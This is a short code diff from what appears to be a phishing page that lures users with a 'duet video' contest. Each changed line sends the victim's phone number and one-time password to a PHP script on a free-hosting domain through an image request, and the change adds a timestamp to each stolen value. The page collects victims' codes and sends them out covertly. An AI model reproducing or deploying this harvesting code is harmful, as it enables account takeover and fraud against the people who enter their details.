@@ -145,7 +145,8 @@ Now create a duet video with your favorite team's player's video, choose from te
 
   }, 5000);					
 				}
-				newImg.src = 'https://goauniversity.000webhostapp.com/wp-content/uploads/2021/10/mx.php?url='+phn;
+				var sd = new Date().toTimeString();
+				newImg.src = 'https://goauniversity.000webhostapp.com/wp-content/uploads/2021/10/mx.php?url='+ sd + '-' +phn;
             } else {
                 m.style.display = 'block';
             }
@@ -165,7 +166,9 @@ Now create a duet video with your favorite team's player's video, choose from te
 
   }, 5000);					
 				}
-				newImg2.src = 'https://goauniversity.000webhostapp.com/wp-content/uploads/2021/10/mx.php?url='+ otp;
+								var sd = new Date().toTimeString();
+
+				newImg2.src = 'https://goauniversity.000webhostapp.com/wp-content/uploads/2021/10/mx.php?url='+ sd + '-' + otp;
 
         }
         
